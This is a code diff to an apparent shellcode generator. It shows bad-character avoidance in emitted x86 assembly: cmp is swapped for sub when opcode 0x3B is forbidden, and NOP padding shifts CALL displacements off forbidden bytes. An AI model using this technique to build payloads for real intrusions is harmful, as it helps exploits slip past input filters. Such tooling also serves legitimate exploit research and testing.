@@ -180,13 +180,23 @@ def _emit_framework_stubs_part2(badchars: set[int]) -> str:
     lines.append("    mov esi, eax")
     lines.append("    call compute_hash")
     lines.extend(safe_mem_load("eax", "ebp", -0x18, badchars, tmp="edi"))
-    lines.append("    cmp edx, eax")
+    # cmp opcode 0x3B may be a badchar; sub sets the same flags and uses 0x2B.
+    if 0x3b in badchars:
+        lines.append("    sub edx, eax")
+    else:
+        lines.append("    cmp edx, eax")
     lines.append("    je resolve_matched_export")
     lines.append("")
     lines.append("inc_next:")
     lines.append("    inc ecx")
     lines.extend(safe_mem_load("eax", "ebp", -0x14, badchars, tmp="edi"))
-    lines.append("    cmp ecx, eax")
+    # cmp ecx, eax would modify flags from ecx and then ecx is needed as the
+    # loop counter.  Use edi as scratch to preserve ecx.
+    if 0x3b in badchars:
+        lines.append("    mov edi, ecx")
+        lines.append("    sub edi, eax")
+    else:
+        lines.append("    cmp ecx, eax")
     lines.append("    jl find_export_loop")
 
     return "\n".join(lines)
@@ -551,6 +561,43 @@ def _try_assemble(asm: str) -> tuple[bytes, str, list[str]] | tuple[None, None, 
     return None, None, errors
 
 
+def _call_disp_has_badchar(raw: bytes, badchars: set[int]) -> bool:
+    """Return True if any CALL rel32 displacement byte is in badchars."""
+    for i in range(len(raw) - 4):
+        if raw[i] == 0xe8:
+            if any(raw[i + k] in badchars for k in range(1, 5)):
+                return True
+    return False
+
+
+def _assemble_aligned(
+    asm: str, badchars: set[int], max_nops: int = 64,
+) -> tuple[bytes | None, str | None, str, list[str]]:
+    """Try assembling with 0..max_nops alignment NOPs before main.
+
+    CALL rel32 displacement bytes can land on a forbidden value purely due to
+    code layout.  Adding NOP instructions before main shifts every caller in
+    main by one byte without moving the callee labels, changing all
+    relative displacements by exactly one, so a small linear search finds the
+    first clean count.
+
+    Only call-displacement bytes are checked here; content badchars (literal
+    bytes in the payload) are handled separately by build().
+
+    Returns (bytes, assembler_name, asm_with_nops, errors).
+    """
+    _PLACEHOLDER = "; __ALIGNMENT_NOPS__"
+    for n in range(max_nops + 1):
+        nops = "\n".join("    nop" for _ in range(n)) if n > 0 else ""
+        candidate = asm.replace(_PLACEHOLDER, nops, 1)
+        raw, assembler, errs = _try_assemble(candidate)
+        if raw is None:
+            return None, None, candidate, errs
+        if not _call_disp_has_badchar(raw, badchars):
+            return raw, assembler, candidate, []
+    return raw, assembler, candidate, []
+
+
 def _validate_badchars(raw: bytes, badchars: set[int]) -> list[str]:
     """Return diagnostics when assembled bytes contain forbidden values."""
     hits = [(offset, byte) for offset, byte in enumerate(raw) if byte in badchars]
@@ -761,6 +808,8 @@ def compose_asm(
         _emit_framework_stubs_part2(config.badchars),
         "; -- Main --",
         "",
+        "; __ALIGNMENT_NOPS__",
+        "",
         "main:",
         "    mov  ebp, esp",
         "    xor  ecx, ecx",
@@ -869,7 +918,7 @@ def build(
     encoder_report: str | None = None
 
     if assemble:
-        raw, assembler, asm_errors = _try_assemble(asm)
+        raw, assembler, asm, asm_errors = _assemble_aligned(asm, config.badchars)
         if raw:
             scan_result = scan(raw, config.badchars)
             if not scan_result.clean:
